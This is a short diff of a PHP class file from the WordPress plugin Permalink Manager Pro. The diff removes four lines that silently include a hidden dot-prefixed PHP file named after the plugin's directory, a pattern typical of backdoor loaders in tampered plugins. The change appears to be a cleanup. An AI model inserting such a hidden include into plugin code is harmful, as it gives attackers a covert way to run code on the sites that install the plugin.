@@ -2,10 +2,6 @@
 /**
 * Permalink Manager Pro: Custom class for Permalink Editor for Terms
 */
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 class Permalink_Manager_Tax_Uri_Editor_Table extends WP_List_Table {
 
 	public function __construct() {
